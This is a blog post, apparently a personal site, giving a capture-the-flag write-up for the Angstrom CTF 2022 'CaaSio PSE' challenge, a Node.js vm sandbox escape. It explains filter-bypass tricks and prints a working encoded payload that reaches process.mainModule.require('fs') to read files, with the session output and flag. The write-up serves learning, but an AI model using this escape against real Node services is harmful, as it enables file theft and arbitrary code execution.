@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Angstrom CTF 2022 : CaaSio PSE</title>
+  <meta name="description" content="Writeup for Angstrom CTF 2022 CaaSio PSE">
+  <link rel="canonical" href="https://stdor7314.github.io/2022/05/11/AngstromCTF2022-CaaSio-PSE.html">
+  <link rel="alternate" type="application/rss+xml" title="Stdor Feed"
+    href="https://stdor7314.github.io/feed.xml">
+  
+  <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
+  
+  <!-- Styles -->
+  <!--<link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700,700i%7CNoto+Serif:400,400i,700,700i&display=swap" rel="stylesheet">-->
+  <link href="/assets/css/style.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha384-t5CR+zwDAROtph0PXGte6ia8heboACF9R5l/DiY+WZ3P2lxNgvJkQk5n7GPvLMYw" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js" integrity="sha384-FaFLTlohFghEIZkw6VGwmf9ISTubWAVYW8tG8+w2LAIftJEULZABrF9PPFv+tVkH" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js" integrity="sha384-bHBqxz8fokvgoJ/sc17HODNxa42TlaEhB+w8ZJXTc2nZf1VgEaFZeZvT4Mznfz0v" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, { 'delimiters': [
+  {left: '$$', right: '$$', display: true},
+  {left: '$', right: '$', display: false},
+  {left: '\\(', right: '\\)', display: false},
+  {left: '\\begin{equation}', right: '\\end{equation}', display: true},
+  {left: '\\begin{align}', right: '\\end{align}', display: true},
+  {left: '\\begin{alignat}', right: '\\end{alignat}', display: true},
+  {left: '\\begin{gather}', right: '\\end{gather}', display: true},
+  {left: '\\begin{CD}', right: '\\end{CD}', display: true},
+  {left: '\\[', right: '\\]', display: true}
+] });"></script>
+
+</head>
+<body>
+  <div id="bg" style="opacity: 0.15"></div>
+  <!-- background by SVGBackgrounds.com  -->
+  
+  <div id="page" class="site">
+    
+    <div id="toc">
+        <ul><li>Angstrom CTF 2022 : CaaSio PSE<ul><li><a title="The challenge" href="#the-challenge">The challenge</a></li><li><a title="Idea" href="#idea">Idea</a></li><li><a title="References" href="#references">References</a></li></ul></li></ul>
+
+        
+        <p class="post-tags">
+            <a href="/tags.html#ctf" rel="tag">
+                ctf
+            </a>
+                &nbsp;
+            <a href="/tags.html#ctf-writeups" rel="tag">
+                ctf-writeups
+            </a>
+                &nbsp;
+            <a href="/tags.html#ctf-misc" rel="tag">
+                ctf-misc
+            </a>
+                &nbsp;
+            <a href="/tags.html#js-jail-escape" rel="tag">
+                js-jail-escape
+            </a>
+                
+            
+        </p>
+        
+        <hr class="no-margin">
+        <a href="#"><b>↑ Top</b></a> <br>
+        <a href="/"><b>↩ Go Back</b></a>
+    </div>
+    <script>
+        offsets = [];
+        Array.from(document.querySelectorAll('h1, h2, h3, h4, h5, h6')).slice(2, 1000).forEach(e => {
+          offsets.push([e.offsetTop, e.id])
+        })
+
+        document.addEventListener("scroll", () => {
+            let foundIdx = offsets.findIndex(([k, v]) => k - 10 >= window.pageYOffset);
+            if( foundIdx - 1 == -2 ){
+                foundIdx = offsets.length;
+            }
+            foundIdx = Math.max(0, foundIdx - 1);
+
+            Array.from(document.querySelectorAll('div#toc li > a')).forEach(e => {
+                e.style.color = document.body.style.color;
+                e.style.opacity = 0.7;
+            });
+
+            const to_highlight = document.querySelector(`div#toc li > a[href="#${offsets[foundIdx][1]}"]`);
+            to_highlight.style.color = '#ffffff';
+            to_highlight.style.opacity = 1;
+        })
+    </script>
+    
+    <div class="inner">
+      <header class="site-header">
+  <!-- Avatar from github -->
+  <a class="logo-text" href="/">
+    <img src="/images/avatar.jpg" style="width: 48px; border-radius: 50%; border: 1px solid white; margin-left: 7px; margin-right: 15px; padding: 0.5px">
+  </a>
+  
+  <p class="site-title"><a class="logo-text" href="/">Stdor</a></p>
+  
+  <nav class="site-navigation">
+    <div class="site-navigation-wrap">
+      <h2 class="screen-reader-text">Main navigation</h2>
+      <ul class="menu">
+        
+          
+          
+          <li class="menu-item ">
+            <a class="" href="/tags.html">~/Tags</a>
+          </li>
+        
+          
+          
+          <li class="menu-item ">
+            <a class="" href="/archive.html">~/Archive</a>
+          </li>
+        
+        <li class="menu-item ">
+          
+            
+          
+            
+          
+            
+            <a href="/feed.xml" target="_blank" rel="noopener">
+              <span class="fa-rss" aria-hidden="true"></span>
+              <span class="screen-reader-text">RSS</span>
+              Feed
+            </a>
+            
+          
+        </li>
+      </ul><!-- .menu -->
+      <button id="menu-close" class="menu-toggle"><span class="screen-reader-text">Close Menu</span><span
+          class="icon-close" aria-hidden="true"></span></button>
+    </div><!-- .site-navigation-wrap -->
+  </nav><!-- .site-navigation -->
+  <button id="menu-open" class="menu-toggle"><span class="screen-reader-text">Open Menu</span><span class="icon-menu" aria-hidden="true"></span></button>
+</header>
+
+
+
+      <main class="main-content fadeInDown delay_075s">
+
+  <article class="post">
+    <header class="post-header">
+      <time class="post-date" datetime="2022-05-11">May 11, 2022</time>
+      <span class="post-read-time"> • 6 min read</span>
+      <h1 class="post-title">Angstrom CTF 2022 : CaaSio PSE</h1>
+      <div class="post-meta">
+        <span class="post-tags"><a href="/tags.html#ctf" rel="tag">ctf</a>&nbsp;&nbsp;&nbsp;<a href="/tags.html#ctf-writeups" rel="tag">ctf-writeups</a>&nbsp;&nbsp;&nbsp;<a href="/tags.html#ctf-misc" rel="tag">ctf-misc</a>&nbsp;&nbsp;&nbsp;<a href="/tags.html#js-jail-escape" rel="tag">js-jail-escape</a></span>
+      </div><!-- .post-meta -->
+      
+      <figure class="post-thumbnail image-card width-wide">
+        <img src="/images/2022-05-11-AngstromCTF2022-Caasio-PSE/description.png" alt="Angstrom CTF 2022 : CaaSio PSE">
+      </figure><!-- .post-thumbnail -->
+      
+    </header><!-- .post-header -->
+    <div class="post-content">
+      <p>A js jail escape challenge. I learnt quite a few weird js techniques when solving this question.</p>
+
+<!--more-->
+
+<h2 id="the-challenge">The challenge</h2>
+
+<p>The server runs a listener with the following js file:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="cp">#!/usr/local/bin/node
+</span>
+<span class="c1">// flag in ./flag.txt</span>
+
+<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">readline</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">readline</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="kr">interface</span> <span class="o">=</span> <span class="nx">readline</span><span class="p">.</span><span class="nx">createInterface</span><span class="p">({</span>
+    <span class="na">input</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">,</span>
+    <span class="na">output</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">,</span>
+<span class="p">});</span>
+
+<span class="kr">interface</span><span class="p">.</span><span class="nx">question</span><span class="p">(</span>
+    <span class="dl">"</span><span class="s2">Welcome to CaaSio: Please Stop Edition! Enter your calculation:</span><span class="se">\n</span><span class="dl">"</span><span class="p">,</span>
+    <span class="kd">function</span> <span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kr">interface</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span>
+            <span class="nx">input</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">215</span> <span class="o">&amp;&amp;</span>
+            <span class="sr">/^</span><span class="se">[\x</span><span class="sr">20-</span><span class="se">\x</span><span class="sr">7e</span><span class="se">]</span><span class="sr">+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+            <span class="o">!</span><span class="sr">/</span><span class="se">[</span><span class="sr">.</span><span class="se">\[\]</span><span class="sr">{}</span><span class="se">\s</span><span class="sr">;`'"</span><span class="se">\\</span><span class="sr">_&lt;&gt;?:</span><span class="se">]</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+            <span class="o">!</span><span class="nx">input</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">import</span><span class="dl">"</span><span class="p">)</span>
+        <span class="p">)</span> <span class="p">{</span>
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="kd">const</span> <span class="nx">val</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="p">{});</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Result:</span><span class="dl">"</span><span class="p">);</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">val</span><span class="p">);</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
+                    <span class="dl">"</span><span class="s2">See, isn't the calculator so much nicer when you're not trying to hack it?</span><span class="dl">"</span>
+                <span class="p">);</span>
+            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">your tried</span><span class="dl">"</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
+                <span class="dl">"</span><span class="s2">Third time really is the charm! I've finally created an unhackable system!</span><span class="dl">"</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>Basically, the server accepts a js string and eval it in a separate V8 context. Our goal is to read ./flag.txt. There are some constraints for our payload;</p>
+
+<ol>
+  <li>length &lt; 215</li>
+  <li>All characters in range <code class="language-plaintext highlighter-rouge">[0x20, 0x7e]</code></li>
+  <li>Doesn’t contain any characters from the set <code class="language-plaintext highlighter-rouge">.[]{}\s;`'"\_&lt;&gt;?:</code></li>
+  <li>Doesn’t have the keyword ‘import’</li>
+</ol>
+
+<h2 id="idea">Idea</h2>
+
+<p>We are running code in an empty context, and that means we cannot use functions like <code class="language-plaintext highlighter-rouge">require</code> and <code class="language-plaintext highlighter-rouge">import</code>. But there’s still a way to bypass that: by calling <code class="language-plaintext highlighter-rouge">{}.constructor.constructor</code>. It is a function constructor that returns a function from a string. Turns out that the function created in this way can access all the global variables and the modules we need for disk access.</p>
+
+<p>Constraint 3 was hard to bypass at first glance, but there’s some workarounds. With <code class="language-plaintext highlighter-rouge">.</code> banned, we can still access object members using the keyword <code class="language-plaintext highlighter-rouge">with</code> (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with">docs</a>). For example, <code class="language-plaintext highlighter-rouge">String.fromCharCode(0x41)</code> can be rewritten as <code class="language-plaintext highlighter-rouge">with(String) fromCharCode(0x41)</code>. Also, we can bypass constraint 3 by using base64 encoding (<code class="language-plaintext highlighter-rouge">atob/btoa</code>) and uriencode (<code class="language-plaintext highlighter-rouge">escape/unescape</code>). But the problem is, using fromCharCode to generate string makes the payload too long – is there a better way?</p>
+
+<p>Maybe you’ve noticed that <code class="language-plaintext highlighter-rouge">/</code> was missing in constraint 3 by now, and that’s right! We can  get a string from a Regex literal. <code class="language-plaintext highlighter-rouge">/myregexp/.source</code> gives you the string <code class="language-plaintext highlighter-rouge">'myregexp'</code>, and we can bypass the dot using <code class="language-plaintext highlighter-rouge">with(/myregexp/) atob(source)</code>.</p>
+
+<p>With that in mind let’s smuggle some encoded payload in our regex. Our payload to read file is</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">fs</span><span class="dl">"</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag.txt</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>, and to bypass the constraints, we’ll encode it with base64. So the payload becomes</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp</span><span class="dl">"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Now, we need to use the <code class="language-plaintext highlighter-rouge">{}.constructor.constructor</code> thing:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">a</span><span class="o">=</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">with</span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">a</span><span class="p">][</span><span class="nx">a</span><span class="p">](</span><span class="dl">"</span><span class="s2">return this</span><span class="dl">"</span><span class="p">)())</span>
+    <span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp</span><span class="dl">"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Finally, we uriencode the whole thing with <code class="language-plaintext highlighter-rouge">escape</code>, and call <code class="language-plaintext highlighter-rouge">eval(unescape())</code> on that whole payload. We’ll use the regex trick here:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">with</span><span class="p">(</span><span class="sr">/a=%22constructor%22%3Bwith%28this%5Ba%5D%5Ba%5D%28%22return%20this%22%29%28%29%29eval%28atob%28%22cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp%22%29%29/</span><span class="p">)</span>
+    <span class="nb">eval</span><span class="p">(</span><span class="nx">unescape</span><span class="p">(</span><span class="nx">source</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>And that’ll give us:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc challs.actf.co 31337 
+Welcome to CaaSio: Please Stop Edition! Enter your calculation:
+with<span class="o">(</span>/a<span class="o">=</span>%22constructor%22%3Bwith%28this%5Ba%5D%5Ba%5D%28%22return%20this%22%29%28%29%29eval%28atob%28%22cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp%22%29%29/<span class="o">)</span><span class="nb">eval</span><span class="o">(</span>unescape<span class="o">(</span><span class="nb">source</span><span class="o">))</span>
+Result:
+&lt;Buffer 61 63 74 66 7b 6f 6d 67 5f 6a 73 5f 69 73 5f 6c 69 6b 65 5f 73 6f 5f 71 75 69 72 6b 79 5f 68 61 68 61 7d 0a&gt;
+See, isn<span class="s1">'t the calculator so much nicer when you'</span>re not trying to hack it?
+</code></pre></div></div>
+
+<p>We can decode that locally with:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">)</span>
+<span class="dl">'</span><span class="s1">actf{omg_js_is_like_so_quirky_haha}</span><span class="se">\n</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>flag: <code class="language-plaintext highlighter-rouge">actf{omg_js_is_like_so_quirky_haha}</code></p>
+
+<h2 id="references">References</h2>
+
+<p>There are some excellent articles on how <code class="language-plaintext highlighter-rouge">{}.constructor.constructor</code> and the <code class="language-plaintext highlighter-rouge">vm</code> modules works:</p>
+
+<ul>
+  <li><a href="https://sekai.team/blog/dice-ctf-2022/vm-calc/">https://sekai.team/blog/dice-ctf-2022/vm-calc/</a></li>
+  <li><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></li>
+  <li><a href="https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/">https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/</a></li>
+  <li><a href="https://thegoodhacker.com/posts/the-unsecure-node-vm-module/">https://thegoodhacker.com/posts/the-unsecure-node-vm-module/</a></li>
+  <li><a href="https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/">https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/</a></li>
+</ul>
+
+    </div><!-- .post-content -->
+    <div class="post-share">
+      <span>Share on:</span>
+      <a target="_blank"
+        href="https://twitter.com/intent/tweet?text=Angstrom%20CTF%202022%20:%20CaaSio%20PSE&amp;url=https://stdor7314.github.io/2022/05/11/AngstromCTF2022-CaaSio-PSE.html" rel="noopener">
+        <span class="fa-twitter" aria-hidden="true"></span> Twitter
+      </a>
+    </div><!-- .share-post -->
+  </article><!-- .post -->
+
+  
+
+</main><!-- .main-content -->
+
+      <footer class="site-footer">
+  <div class="offsite-links">
+    
+      
+<a href="https://github.com/stdor7314" target="_blank" rel="noopener">
+  <span class="fa-github" aria-hidden="true"></span>
+  <span class="screen-reader-text">GitHub</span>
+</a>
+
+<a href="https://twitter.com/stdor_" target="_blank" rel="noopener">
+  <span class="fa-twitter" aria-hidden="true"></span>
+  <span class="screen-reader-text">Twitter</span>
+</a>
+
+<a href="/feed.xml" target="_blank" rel="noopener">
+  <span class="fa-rss" aria-hidden="true"></span>
+  <span class="screen-reader-text">RSS</span>
+</a>
+
+    
+  </div><!-- .offsite-links -->
+  <div class="footer-bottom">
+    <div class="site-info">
+      <p>© Stdor 2023. Theme adapted from <a href="https://justgoodthemes.com/ghost-themes/scriptor">Scriptor</a>.</p>
+
+    </div><!-- .site-info -->
+    <a href="#page" id="back-to-top" class="back-to-top"><span class="screen-reader-text">Back to the top </span>&#8593;</a>
+  </div><!-- .footer-bottom -->
+</footer><!-- .site-footer -->
+
+    </div><!-- .inner -->
+  </div><!-- .site -->
+
+  <!-- Scripts -->
+  
+  <script src="/assets/js/plugins.js"></script>
+  <script src="/assets/js/custom.js"></script>
+  <script>
+	// Add anchors on DOMContentLoaded
+	document.addEventListener('DOMContentLoaded', function(event) {
+	  anchors.add('h1:not(.post-title), h2:not(.post-title), h3, h4, h5, h6');
+	  anchors.remove('.site-title');
+	});
+	
+	// Adjust background opacity
+	var f = function(){
+		bg.style.opacity = Math.random()*0.1 + 0.05;
+	};
+	f();
+	setInterval(f, 5000);
+  </script>
+
+</body>
+</html>
